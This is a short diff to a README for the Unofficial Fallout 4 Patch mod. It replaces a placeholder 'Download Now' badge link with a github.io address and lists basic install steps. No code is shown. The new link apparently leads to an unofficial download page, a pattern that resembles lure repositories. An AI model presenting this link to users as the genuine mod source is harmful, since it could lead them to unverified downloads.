@@ -9,7 +9,7 @@ Trusted by millions of players, UFO4P is considered an essential mod for any sta
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-grey?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-grey?style=for-the-badge)](https://unofficial-fallout-4-patch.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Install **F4SE** (optional but recommended for deeper compatibility).  
